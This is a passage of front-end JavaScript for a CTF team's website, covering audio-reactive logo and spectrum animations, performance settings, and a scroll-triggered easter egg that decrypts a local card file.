        // 直接设置初始状态
        updateAudioStatus('initial');
        
        // 确保Logo在手机模式下有正确的初始状态
        if (isMobile) {
            const logo = document.getElementById('logo');
            if (logo) {
                // 重置Logo的transform，确保没有残留的鼠标跟随效果
                logo.style.transform = '';
            }
        }
    }
        
    // 添加音量控制（可选）
    if (audio) {
        audio.volume = 1.0; // 设置音量为100%
        
        // 循环播放
        audio.loop = true;
    }
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const requiredCount = isTouchDevice ? 20 : 150;
    
    // 初始化性能档位
    const savedLevel = localStorage.getItem('tkctf-performance-level');
    if (savedLevel && ['low', 'medium', 'high'].includes(savedLevel)) {
        performanceLevel = savedLevel;
        // 更新UI状态
        document.querySelectorAll('.performance-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        document.querySelector(`[data-level="${savedLevel}"]`).classList.add('active');
    }
    
    // 绑定性能档位切换事件
    document.querySelectorAll('.performance-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const level = btn.getAttribute('data-level');
            switchPerformanceLevel(level);
        });
    });
    
    // 初始化性能档位控件折叠状态
    const savedCollapsedState = localStorage.getItem('tkctf-performance-toggle-collapsed');
    
    if (savedCollapsedState === 'true') {
        isPerformanceToggleCollapsed = true;
        document.getElementById('performanceToggle').classList.add('collapsed');
        document.querySelector('.collapse-icon').textContent = '<';
    }
    
    // 绑定折叠按钮事件
    const collapseBtn = document.getElementById('performanceToggleCollapse');
    if (collapseBtn) {
        collapseBtn.addEventListener('click', togglePerformanceToggle);
    }
    
    // 延迟检查NAV位置（等待nav渲染完成）
    setTimeout(() => {
        checkNavPosition();
    }, 1000);
    
    // 持续检查NAV位置变化
    setInterval(() => {
        checkNavPosition();
    }, 500);
});

// 节流函数优化滚动性能
function throttle(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// 注释掉节流滚动事件，可能导致加载异常
// window.addEventListener('scroll', throttle(() => {
//     animateOnScroll();
//     handleBackToTop();
// }, 16)); // 约60fps

let scrollCount = 0;
let lastScrollTime = 0;
let particleInterval = null;
let isEasterEggActive = false;
let bounceCount = 0;
let currentBounceHeight = 1;
let isBouncing = false;
let hasResetBounce = false;

// 滚动位置跟踪
let lastScrollTop = 0;
let wheelAccumulator = 0;
let lastWheelTime = 0;

// 性能档位控件折叠状态
let isPerformanceToggleCollapsed = false;
let savedToggleHeight = 0;
let isAvoidingNav = false;

// 科技蓝颗粒迸发效果相关变量
let lastBurstTime = 0;
const burstCooldown = 2000; // 2秒冷却时间

function handleEasterEggScroll() {
    const footer = document.getElementById('mainFooter');
    if (!footer || isEasterEggActive) return;

    const audio = document.getElementById('bgmAudio');
    if (!audio || audio.paused) return;

    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const footerTop = footer.offsetTop;
    const windowHeight = window.innerHeight;
    const documentHeight = document.documentElement.scrollHeight;

    const isAtBottom = scrollTop + windowHeight >= documentHeight - 1; // 允许1px的误差
    const isFooterFullyVisible = scrollTop + windowHeight >= footerTop + footer.offsetHeight;

    if (isAtBottom && isFooterFullyVisible) {
        // 触发弹动效果
        triggerBounceEffect();
    }
}

function isAtBottomEnhanced() {
    const footer = document.getElementById('mainFooter');
    if (!footer) return false;
    
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const footerTop = footer.offsetTop;
    const windowHeight = window.innerHeight;
    const documentHeight = document.documentElement.scrollHeight;
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    
    if (isTouchDevice) {
        const isAtBottom = scrollTop + windowHeight >= documentHeight - 20; // 允许20px误差
        const isFooterVisible = scrollTop + windowHeight >= footerTop - 50; // footer可见即可，允许50px误差
        return isAtBottom && isFooterVisible;
    } else {
        const isAtBottom = scrollTop + windowHeight >= documentHeight - 1;
        const isFooterFullyVisible = scrollTop + windowHeight >= footerTop + footer.offsetHeight;
        return isAtBottom && isFooterFullyVisible;
    }
}

// 鼠标滚轮事件处理
function handleWheelEvent(event) {
    const footer = document.getElementById('mainFooter');
    if (!footer) return;
    
    const audio = document.getElementById('bgmAudio');
    if (!audio || audio.paused) return;
    
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const footerTop = footer.offsetTop;
    const windowHeight = window.innerHeight;
    const documentHeight = document.documentElement.scrollHeight;
    
    const isAtBottom = scrollTop + windowHeight >= documentHeight - 1;
    const isFooterFullyVisible = scrollTop + windowHeight >= footerTop + footer.offsetHeight;
    
    if (isAtBottom && isFooterFullyVisible) {
        const currentTime = Date.now();
        
        if (event.deltaY > 0) {
            if (!isEasterEggActive) {
                const magnitude = Math.abs(event.deltaY);
                const boost = 1 + Math.min(2, magnitude / 150); // 1~3 倍（更克制）
                wheelAccumulator += magnitude * boost;

                const fastWindowMs = 250;
                const triggerThreshold = 3200;

                if (currentTime - lastWheelTime < fastWindowMs) {
                    if (wheelAccumulator >= triggerThreshold) {
                        event.preventDefault();

                        const steps = Math.min(3, Math.max(1, Math.ceil(wheelAccumulator / 1200)));
                        for (let i = 0; i < steps; i++) {
                            addBounceHeight(0);
                        }

                        wheelAccumulator = 0; 
                    }
                } else {
                    wheelAccumulator = magnitude * boost;
                }

                lastWheelTime = currentTime;
            }
        } else if (event.deltaY < 0) {
            if (!isEasterEggActive) {
                if (bounceCount > 0) {
                    event.preventDefault();
                    resetBounceHeight();
                }
            } else {
                event.preventDefault();
                returnToMain();
            }
        }
    }
}

// 创建粒子效果
function createParticles(intensity) {
    const particleContainer = document.getElementById('particleContainer');
    if (!particleContainer) return;

    // 根据强度调整粒子数量
    const particleCount = Math.min(5 + intensity * 2, 30);
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        // 随机位置
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 2 + 's';
        particle.style.animationDuration = (2 + Math.random() * 2) + 's';
        
        // 根据强度调整大小和亮度
        const size = 2 + intensity * 0.5;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        
        const brightness = 0.5 + intensity * 0.05;
        particle.style.boxShadow = `0 0 ${10 + intensity}px #00e4ff, 0 0 ${20 + intensity * 2}px #00e4ff, 0 0 ${30 + intensity * 3}px #00e4ff`;
        
        particleContainer.appendChild(particle);
        
        // 3秒后移除粒子
        setTimeout(() => {
            if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
            }
        }, 3000);
    }
}

function triggerBounceEffect() {
    if (isBouncing) return;
    isBouncing = true;
    
    // 创建粒子效果
    createParticles(1);
    
    setTimeout(() => {
        isBouncing = false;
    }, 100);
}

// 增加弹动高度
function addBounceHeight(deltaY) {
    const footer = document.getElementById('mainFooter');
    if (!footer) return;
    
    if (hasResetBounce) {
        bounceCount = 0;
        hasResetBounce = false;
    }
    
    bounceCount++;
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const requiredCount = isTouchDevice ? 20 : 150;
    
    
    if (bounceCount >= requiredCount) {
        triggerEasterEgg();
    } else {
        const progressRatio = bounceCount / requiredCount;
        if (progressRatio >= 0.01) {
            createPersistentGlow();
        }
    }
}

function resetBounceHeight() {
    const footer = document.getElementById('mainFooter');
    if (!footer) return;
    
    currentBounceHeight = 1;
    footer.style.borderTopWidth = '1px';
    
    bounceCount = 0;
    hasResetBounce = true;
    
    const existingGlows = document.querySelectorAll('.persistent-glow');
    existingGlows.forEach(glow => glow.remove());
    
    const dataStreams = document.getElementById('dataStreams');
    if (dataStreams) {
        dataStreams.style.transition = 'opacity 1s ease-in';
        dataStreams.style.opacity = '1';
    }
}


function createPersistentGlow() {
    const existingGlow = document.getElementById('persistentGlow');
    if (existingGlow) {
        updatePersistentGlow(existingGlow);
        return;
    }
    
    const glow = document.createElement('div');
    glow.id = 'persistentGlow';
    glow.className = 'persistent-glow';
    
    const isMobile = window.innerWidth < 768;
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const requiredCount = isTouchDevice ? 20 : 150;
    const progressRatio = Math.min(bounceCount / requiredCount, 1);
    
    const baseHeight = isMobile ? 15 : 20;
    const maxHeight = isMobile ? 135 : 135; // 和Footer一样高
    const currentHeight = baseHeight + (maxHeight - baseHeight) * progressRatio;
    
    const baseOpacity = isMobile ? 0.4 : 0.6;
    const maxOpacity = 0.9;
    const currentOpacity = baseOpacity + (maxOpacity - baseOpacity) * progressRatio;
    
    glow.style.cssText = `
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${currentHeight}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${currentOpacity}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `;
    
    document.body.appendChild(glow);
    
    // 手机端：隐藏data-streams以节省性能
    if (isMobile) {
        const dataStreams = document.getElementById('dataStreams');
        if (dataStreams) {
            dataStreams.style.transition = 'opacity 1s ease-out';
            dataStreams.style.opacity = '0';
        }
    }
}

function updatePersistentGlow(glow) {
    const isMobile = window.innerWidth < 768;
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const requiredCount = isTouchDevice ? 20 : 150;
    const progressRatio = Math.min(bounceCount / requiredCount, 1);
    
    const baseHeight = isMobile ? 15 : 20;
    const maxHeight = isMobile ? 135 : 135; // 和Footer一样高
    const currentHeight = baseHeight + (maxHeight - baseHeight) * progressRatio;
    
    const baseOpacity = isMobile ? 0.4 : 0.6;
    const maxOpacity = 0.9;
    const currentOpacity = baseOpacity + (maxOpacity - baseOpacity) * progressRatio;
    
    glow.style.height = `${currentHeight}px`;
    glow.style.background = `linear-gradient(to top, rgba(0, 228, 255, ${currentOpacity}), transparent)`;
}

function triggerEasterEgg() {
    isEasterEggActive = true;
    const easterEgg = document.getElementById('easterEgg');
    const footer = document.getElementById('mainFooter');
    
    if (!easterEgg) return;

    if (footer) {
        footer.style.display = 'none';
    }

    const persistentGlow = document.getElementById('persistentGlow');
    if (persistentGlow) {
        persistentGlow.style.display = 'none';
    }

    // 恢复data-streams显示
    const dataStreams = document.getElementById('dataStreams');
    if (dataStreams) {
        dataStreams.style.transition = 'opacity 1s ease-in';
        dataStreams.style.opacity = '1';
    }

    loadCardContent();

    easterEgg.classList.add('show');
    
    easterEgg.scrollIntoView({ behavior: 'smooth' });
    
    startEasterEggParticleEffect();
}

function getDecryptionKey() {
    const keyFragments = [
        'IUAj', 
        'S2V5', 
        'U2VjcmV0', 
        'MjAyNQ==',
        'Q1RG', 
        'VEs=' 
    ];
    
    const obfuscationMap = Object.assign({}, {
        '!': 'A', '@': 'B', '#': 'C', 'T': 'D', 'K': 'E',
        'C': 'F', 'F': 'G', '2': 'H', '0': 'I', '5': 'J',
        'S': 'K', 'e': 'L', 'c': 'M', 'r': 'N', 't': 'O',
      }, {
        'K': 'P', 'e': 'Q', 'y': 'R', '!': 'S', '@': 'T'
      });
    
    // 解码所有片段
    let decodedParts = [];
    for (let fragment of keyFragments) {
        decodedParts.push(atob(fragment));
    }
    
    // 组合解码后的片段
    let combinedKey = decodedParts.join('');
    
    const reverseMap = {};
    for (const [original, obfuscated] of Object.entries(obfuscationMap)) {
        reverseMap[obfuscated] = original;
    }
    
    let finalKey = '';
    for (let char of combinedKey) {
        finalKey += reverseMap[char] || char;
    }
    
    return finalKey;
}

function decryptCardContent(encryptedContent) {
    try {
        const secretKey = getDecryptionKey();
        
        const decrypted = CryptoJS.AES.decrypt(encryptedContent, secretKey);
        const decryptedText = decrypted.toString(CryptoJS.enc.Utf8);
        
        if (!decryptedText) {
            throw new Error('解密失败或密钥错误');
        }
        
        return decryptedText;
    } catch (error) {
        console.error('解密失败:', error);
        throw error;
    }
}

// 加载外部卡片内容
async function loadCardContent() {
    const cardContent = document.getElementById('cardContent');
    if (!cardContent) return;
    
    try {
        const response = await fetch('./data/Card.encrypted');
        if (!response.ok) {
            throw new Error('Failed to load encrypted card content');
        }
        const encryptedContent = await response.text();
        
        const decryptedHTML = decryptCardContent(encryptedContent);
        
        cardContent.innerHTML = decryptedHTML;
        
        // 初始化卡片交互
        initCardInteraction();
        
    } catch (error) {
        console.error('加载或解密卡片内容失败:', error);
        // 如果加载失败，显示默认内容
        cardContent.innerHTML = '<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>关于本网站</h4><p>内容加载失败</p></div></div></div></div>';
        initCardInteraction();
    }
}

// 返回主界面
function returnToMain() {
    isEasterEggActive = false;
    scrollCount = 0;
    bounceCount = 0;
    currentBounceHeight = 1;
    hasResetBounce = false;
    
    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const requiredCount = isTouchDevice ? 20 : 150;
    
    const easterEgg = document.getElementById('easterEgg');
    const footer = document.getElementById('mainFooter');
    
    if (!easterEgg) {
        return;
    }
    
    easterEgg.classList.remove('show');
    
    const cardContent = document.getElementById('cardContent');
    if (cardContent) {
        cardContent.innerHTML = '';
    }
    
    stopEasterEggParticleEffect();
    
    const persistentGlow = document.getElementById('persistentGlow');
    if (persistentGlow) {
        persistentGlow.remove();
    }
    
    // 恢复data-streams显示
    const dataStreams = document.getElementById('dataStreams');
    if (dataStreams) {
        dataStreams.style.transition = 'opacity 1s ease-in';
        dataStreams.style.opacity = '1';
    }
    
    if (footer) {
        footer.style.display = '';
        footer.style.borderTopWidth = '1px';
    }
    
    if (footer) {
        footer.scrollIntoView({ behavior: 'smooth' });
    }
}

function initCardInteraction() {
    const card = document.getElementById('card');
    if (!card) return;
    
    card.addEventListener('click', function() {
        if (card.classList.contains('flipped')) {
            card.classList.remove('flipped');
        } else {
            card.classList.add('flipped');
        }
    });
}

window.addEventListener('scroll', () => {
    const currentScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    
    // 检测滚动条上移超过1px时重置persistentGlow
    if (currentScrollTop < lastScrollTop - 1) {
        if (bounceCount > 0) {
            resetBounceHeight();
        }
    }
    
    lastScrollTop = currentScrollTop;
    
    handleBackToTop();
    animateOnScroll();
    handleEasterEggScroll();
    
    handleBottomScroll();
});

function handleBottomScroll() {
    const footer = document.getElementById('mainFooter');
    if (!footer || isEasterEggActive) return;

    const audio = document.getElementById('bgmAudio');
    if (!audio || audio.paused) return;
    
    if (isAtBottomEnhanced()) {
        createTechParticleBurst();
    }
}

window.addEventListener('wheel', handleWheelEvent, { passive: false });

let touchStartY = 0;
let touchEndY = 0;
let touchStartTime = 0;
let touchEndTime = 0;
let isTouchScrolling = false;

window.addEventListener('touchstart', function(event) {
    touchStartY = event.touches[0].clientY;
    touchStartTime = Date.now();
    isTouchScrolling = false;
}, { passive: true });

window.addEventListener('touchmove', function(event) {
    isTouchScrolling = true;
}, { passive: true });

window.addEventListener('touchend', function(event) {
    touchEndY = event.changedTouches[0].clientY;
    touchEndTime = Date.now();
    
    if (isEasterEggActive) {
        if (touchStartY < touchEndY) {
            returnToMain();
        }
        return;
    }
    
    const audio = document.getElementById('bgmAudio');
    if (!audio || audio.paused) return;
    
    const footer = document.getElementById('mainFooter');
    if (!footer) return;
    
    setTimeout(() => {
        checkTouchEasterEgg();
    }, 100);
}, { passive: true });

function checkTouchEasterEgg() {
    const footer = document.getElementById('mainFooter');
    if (!footer) return;
    
    const touchDistance = Math.abs(touchEndY - touchStartY);
    const touchDuration = touchEndTime - touchStartTime;
    
    if (touchStartY < touchEndY && touchDistance > 5 && touchDuration < 2000) {
        if (bounceCount > 0) {
            resetBounceHeight();
        }
    }
    else if (isAtBottomEnhanced()) {
        const minScrollDistance = window.innerHeight * 0.45;
        
        if (touchStartY > touchEndY && touchDistance > minScrollDistance && touchDuration < 500) {
            addBounceHeight(0);
        }
    }
}

// 音频控制相关变量
let isPlaying = false;
let audioContext = null;
let analyser = null;
let dataArray = null;
let spectrumBars = [];
let beatDetectionBuffer = [];
let lastBeatTime = 0;

// Web Worker相关变量
let spectrumWorker = null;
let workerSpectrumData = null;
let isWorkerSupported = false;

// Logo相关变量
let svgElement = null;
let pathElements = null;
let progressRect = null;
let isInBeat = false;
let mouseX = 0;
let mouseY = 0;
let targetX = 0;
let targetY = 0;

// 重beats检测相关变量
let lastHeavyBeatTime = 0;
let heavyBeatBuffer = [];
let isInHeavyBeat = false;

// 初始化音频上下文和分析器
function initAudioContext() {
    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const audio = document.getElementById('bgmAudio');
        const source = audioContext.createMediaElementSource(audio);
        
        analyser = audioContext.createAnalyser();
        analyser.fftSize = 2048; // 增加FFT大小以获得更好的频率分辨率
        analyser.smoothingTimeConstant = 0.8;
        const bufferLength = analyser.frequencyBinCount;
        dataArray = new Uint8Array(bufferLength);
        
        source.connect(analyser);
        analyser.connect(audioContext.destination);
        
        // 初始化Web Worker
        initSpectrumWorker();
        
        return true;
    } catch (error) {
        return false;
    }
}

// 初始化Web Worker
function initSpectrumWorker() {
    if (!window.Worker) {
        console.warn('Web Worker not supported, falling back to main thread');
        isWorkerSupported = false;
        return;
    }
    
    try {
        // 根据当前环境选择Worker路径
        const workerPath = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
            ? './src/spectrum-worker.min.js' 
            : './src/spectrum-worker.min.js';
        
        spectrumWorker = new Worker(workerPath);
        isWorkerSupported = true;
        
        spectrumWorker.onmessage = function(e) {
            const { type, data } = e.data;
            
            switch (type) {
                case 'initComplete':
                    // 发送配置给Worker
                    spectrumWorker.postMessage({
                        type: 'config',
                        data: {
                            fftSize: analyser.fftSize,
                            sampleRate: audioContext.sampleRate,
                            beatThreshold: 188,
                            beatCooldown: 25,
                            heavyBeatCooldown: 120
                        }
                    });
                    break;
                case 'processedSpectrumData':
                    workerSpectrumData = data;
                    break;
                case 'error':
                    console.error('Spectrum worker error:', data);
                    break;
                case 'workerStopped':
                    break;
            }
        };
        
        spectrumWorker.onerror = function(error) {
            console.error('Spectrum worker error:', error);
            isWorkerSupported = false;
        };
        
        // 初始化worker
        spectrumWorker.postMessage({
            type: 'init',
            data: {
                fftSize: analyser.fftSize,
                sampleRate: audioContext.sampleRate
            }
        });
        
    } catch (error) {
        console.error('Failed to create spectrum worker:', error);
        isWorkerSupported = false;
    }
}

// 加载SVG文件
function loadLogoSVG() {
    const logo = document.getElementById('logo');
    fetch('./img/TKCTF512.svg')
        .then(response => response.text())
        .then(svgText => {
            logo.innerHTML = svgText;
            svgElement = logo.querySelector('svg');
            if (svgElement) {
                svgElement.id = 'logoSvg';
                svgElement.style.width = '100%';
                svgElement.style.height = '100%';
                
                const viewBox = svgElement.viewBox.baseVal;
                const svgWidth = viewBox.width || 1000;
                
                pathElements = {
                    T0: svgElement.querySelector('.T0'),
                    K: svgElement.querySelector('.K'),
                    C: svgElement.querySelector('.C'),
                    T1: svgElement.querySelector('.T1'),
                    F: svgElement.querySelector('.F')
                };
                
                let defs = svgElement.querySelector('defs');
                if (!defs) {
                    defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
                    svgElement.insertBefore(defs, svgElement.firstChild);
                }
                
                const clipPath = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
                clipPath.id = 'progressClip';
                
                progressRect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                progressRect.setAttribute('x', '0');
                progressRect.setAttribute('y', '0');
                progressRect.setAttribute('width', '0');
                progressRect.setAttribute('height', viewBox.height || 1000);
                
                clipPath.appendChild(progressRect);
                defs.appendChild(clipPath);
                
                const progressGroup = document.createElementNS('http://www.w3.org/2000/svg', 'g');
                progressGroup.id = 'progressGroup';
                progressGroup.setAttribute('clip-path', 'url(#progressClip)');
                
                Object.values(pathElements).forEach(path => {
                    if (path) {
                        path.style.fill = '#010101';
                        
                        const bluePath = path.cloneNode(true);
                        bluePath.style.fill = '#00a2ff';
                        bluePath.style.filter = 'drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))';
                        progressGroup.appendChild(bluePath);
                    }
                });
                
                svgElement.appendChild(progressGroup);
            }
        })
        .catch(err => console.error('加载SVG失败:', err));
}

// 鼠标悬浮磁吸效果
function initMouseFollow() {
    const logoContainer = document.getElementById('logoContainer');
    
    // 手机模式下不启用鼠标跟随效果
    if (isMobile) {
        return;
    }
    
    logoContainer.addEventListener('mousemove', (e) => {
        const rect = logoContainer.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        
        mouseX = (e.clientX - centerX) / 10;
        mouseY = (e.clientY - centerY) / 10;
    });

    logoContainer.addEventListener('mouseleave', () => {
        mouseX = 0;
        mouseY = 0;
    });

    // 平滑跟随动画
    function updateMouseFollow() {
        targetX += (mouseX - targetX) * 0.15;
        targetY += (mouseY - targetY) * 0.15;
        
        if (!isInBeat && Math.abs(targetX) > 0.1 || Math.abs(targetY) > 0.1) {
            const logo = document.getElementById('logo');
            const currentTransform = logo.style.transform || '';
            if (!currentTransform.includes('scale')) {
                logo.style.transform = `translate(${targetX}px, ${targetY}px)`;
            }
        }
        
        requestAnimationFrame(updateMouseFollow);
    }
    updateMouseFollow();
}

// 创建拖影效果
function createTrail(rotation) {
    if (!svgElement) return;
    
    const logoContainer = document.getElementById('logoContainer');
    const trail = document.createElement('div');
    trail.className = 'trail-particle';
    
    const clonedSvg = svgElement.cloneNode(true);
    clonedSvg.style.width = '100%';
    clonedSvg.style.height = '100%';
    clonedSvg.style.transform = `rotate(${rotation}deg)`;
    clonedSvg.style.filter = 'drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)';
    trail.appendChild(clonedSvg);
    
    logoContainer.appendChild(trail);
    
    // 淡入
    setTimeout(() => {
        trail.style.opacity = '0.6';
        trail.style.transition = 'opacity 0.1s ease-out';
    }, 10);
    
    // 淡出
    setTimeout(() => {
        trail.style.opacity = '0';
        trail.style.transition = 'opacity 0.3s ease-out';
    }, 100);
    
    setTimeout(() => {
        trail.remove();
    }, 400);
}

// 创建脉冲光环
function createBeatPulse(intensity) {
    const logoContainer = document.getElementById('logoContainer');
    const ring = document.createElement('div');
    ring.className = 'pulse-ring';
    ring.style.width = '120px';
    ring.style.height = '120px';
    ring.style.border = `${3 + intensity * 2}px solid rgba(0, 255, 255, ${0.9})`;
    ring.style.boxShadow = `0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)`;
    ring.style.animation = 'beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards';
    logoContainer.appendChild(ring);
    
    setTimeout(() => ring.remove(), 800);
}

// 创建声波光环（重beats专用）- 优化性能
function createWaveRing() {
    const logoContainer = document.getElementById('logoContainer');
    const ring = document.createElement('div');
    ring.className = 'wave-ring';
    ring.style.width = '120px';
    ring.style.height = '120px';
    logoContainer.appendChild(ring);
    
    // 缩短动画时长以减少性能负担
    setTimeout(() => ring.remove(), 320);
}

// 音频驱动的logo抖动
function applyAudioDrivenGlitch() {
    if (!analyser || !dataArray || !isPlaying) return;
    
    analyser.getByteFrequencyData(dataArray);
    
    let intensity = 0;
    let spectralCentroid = 0;
    
    // 优先使用Web Worker的结果
    if (isWorkerSupported && workerSpectrumData) {
        intensity = workerSpectrumData.spectrumFeatures.totalEnergy;
        spectralCentroid = workerSpectrumData.spectrumFeatures.spectralCentroid;
    } else {
        // 回退到主线程计算
        const average = dataArray.reduce((a, b) => a + b) / dataArray.length;
        intensity = average / 255;
    }

    // 根据音频强度计算抖动参数 - 提高强度
    const baseShake = 5; // 基础抖动强度
    const shake = baseShake + intensity * 12; // 增加抖动强度
    const rotation = (Math.random() - 0.5) * (1 + intensity * 8); // 增加旋转强度
    
    // 只在非重beats状态下应用音频驱动抖动
    if (!isInHeavyBeat && !isInBeat) {
        const logo = document.getElementById('logo');
        const translateX = (Math.random() - 0.5) * shake;
        const translateY = (Math.random() - 0.5) * shake;
        logo.style.transform = `translate(${translateX}px, ${translateY}px) rotate(${rotation}deg)`;
        
        // 根据强度调整发光效果 - 增强发光变化
        const baseGlow = 25; // 基础发光强度
        const glowIntensity = baseGlow + intensity * 25;
        const glowOpacity = 0.6 + intensity * 0.4;
        logo.style.filter = `drop-shadow(0 0 ${glowIntensity}px rgba(0, 162, 255, ${glowOpacity}))`;
        
        // 使用频谱重心来调整拖影触发
        const trailThreshold = spectralCentroid > 0.5 ? 0.2 : 0.25;
        if (intensity > trailThreshold && Math.random() > 0.75) {
            createTrail(rotation);
        }
    }
}

// 频率转索引的辅助函数
function frequencyToIndex(frequency, sampleRate, fftSize) {
    return Math.round(frequency / (sampleRate / 2) * (fftSize / 2));
}

// 检测1500-2250 Hz频段的Beat (> -4.5 dBFS)
function detectBeat() {
    if (!analyser || !dataArray) return false;
    
    analyser.getByteFrequencyData(dataArray);
    
    const sampleRate = audioContext.sampleRate;
    const startIndex = frequencyToIndex(1500, sampleRate, analyser.fftSize);
    const endIndex = frequencyToIndex(2250, sampleRate, analyser.fftSize);
    
    // 计算指定频段的平均能量
    let sum = 0;
    const validIndices = Math.max(1, endIndex - startIndex + 1);
    for (let i = startIndex; i <= endIndex && i < dataArray.length; i++) {
        sum += dataArray[i];
    }
    const average = sum / validIndices;
    
    // -4.5 dBFS 对应约 188/255 的数值
    const threshold = 188;
    const currentTime = Date.now();
    
    // Beat检测逻辑，降低间隔时间以捕捉快速节奏
    if (average > threshold && (currentTime - lastBeatTime) > 25) {
        lastBeatTime = currentTime;
        return true;
    }
    return false;
}

// 检测重beats（基于频谱20-25%区域的active状态）
function detectHeavyBeat() {
    if (!spectrumBars.length) return false;
    
    const currentTime = Date.now();
    const config = getPerformanceConfig();
    
    // 根据性能档位设置不同的检测参数
    let endIndexRatio, requiredRatio, bufferTime, cooldownTime;
    
    if (performanceLevel === 'high') {
        // 高级档位：更敏感的重型Beats检测
        endIndexRatio = 0.35;  // 检测范围：25%-35%
        requiredRatio = 7 / 10; // 需要7/10的频谱条激活
        bufferTime = 50;        // 50ms检测窗口
        cooldownTime = 250;     // 250ms触发间隔
    } else {
        // 中低级档位：保持原有参数
        endIndexRatio = 0.45;   // 检测范围：25%-45%
        requiredRatio = 9 / 10; // 需要9/10的频谱条激活
        bufferTime = 100;       // 100ms检测窗口
        cooldownTime = 300;     // 300ms触发间隔
    }
    
    // 计算频谱条索引范围
    const totalBars = spectrumBars.length;
    const startIndex = Math.floor(totalBars * 0.25);
    const endIndex = Math.floor(totalBars * endIndexRatio);
    const targetBars = spectrumBars.slice(startIndex, endIndex);
    
    // 统计激活状态的频谱条数量
    let activeBars = 0;
    targetBars.forEach(bar => {
        if (bar.classList.contains('active')) {
            activeBars++;
        }
    });
    
    // 根据性能档位设置激活阈值
    const requiredActiveBars = Math.max(1, Math.ceil(targetBars.length * requiredRatio));
    const isHeavyBeat = activeBars >= requiredActiveBars;
    
    // 记录激活状态到缓冲区
    heavyBeatBuffer.push({
        time: currentTime,
        isActive: isHeavyBeat
    });
    
    // 清理缓冲区
    heavyBeatBuffer = heavyBeatBuffer.filter(record => 
        currentTime - record.time <= bufferTime
    );
    
    // 检查缓冲区内是否有重beats
    const recentHeavyBeats = heavyBeatBuffer.filter(record => record.isActive);
    
    // 根据性能档位设置触发间隔
    if (recentHeavyBeats.length > 0 && (currentTime - lastHeavyBeatTime) > cooldownTime) {
        lastHeavyBeatTime = currentTime;
        return true;
    }
    
    return false;
}

// 更新进度条
function updateProgress() {
    const audio = document.getElementById('bgmAudio');
    if (!audio.duration || !progressRect || !svgElement) return;
    
    const progress = audio.currentTime / audio.duration;
    const viewBox = svgElement.viewBox.baseVal;
    const svgWidth = viewBox.width || 1000;
    
    progressRect.setAttribute('width', svgWidth * progress);
}

// 创建二进制频谱
function createBinarySpectrum() {
    const spectrumContainer = document.getElementById('binarySpectrum');
    const config = getPerformanceConfig();
    
    // 根据性能档位调整频谱数量和宽度
    const barCount = config.spectrumBarCount;
    const barWidth = config.spectrumBarWidth;
    
    spectrumContainer.innerHTML = '';
    spectrumBars = [];
    
    // 手机模式下使用异步创建，避免阻塞主线程
    if (isMobile && barCount > 10) {
        let currentIndex = 0;
        const batchSize = Math.max(1, Math.floor(barCount / 4)); // 分4批创建
        
        function createBatch() {
            const endIndex = Math.min(currentIndex + batchSize, barCount);
            
            for (let i = currentIndex; i < endIndex; i++) {
                const bar = document.createElement('div');
                bar.className = 'spectrum-bar';
                bar.style.left = (i * (100 / barCount)) + '%';
                bar.style.height = '0px'; // 初始高度为0
                bar.style.width = barWidth + 'px'; // 设置频谱条宽度
                
                // 根据性能档位决定是否创建二进制数字容器
                if (config.enableBinaryDigits) {
                    // 创建二进制数字容器
                    const binaryDigits = document.createElement('div');
                    binaryDigits.className = 'binary-digits';
                    
                    // 手机端中档位：添加特殊类以加宽二进制字符
                    if (isMobile && performanceLevel === 'medium') {
                        binaryDigits.classList.add('mobile-medium-digits');
                    }
                    
                    // 生成随机二进制字符串
                    let binaryString = '';
                    const digitCount = Math.floor(Math.random() * 12) + 8; // 增加数字数量
                    for (let j = 0; j < digitCount; j++) {
                        binaryString += Math.random() > 0.5 ? '1' : '0';
                    }
                    binaryDigits.textContent = binaryString;
                    
                    bar.appendChild(binaryDigits);
                }
                spectrumContainer.appendChild(bar);
                spectrumBars.push(bar);
            }
            
            currentIndex = endIndex;
            
            // 如果还有更多元素需要创建，继续下一批
            if (currentIndex < barCount) {
                requestAnimationFrame(createBatch);
            }
        }
        
        // 开始创建第一批
        requestAnimationFrame(createBatch);
    } else {
        // 桌面模式或少量元素时同步创建
        for (let i = 0; i < barCount; i++) {
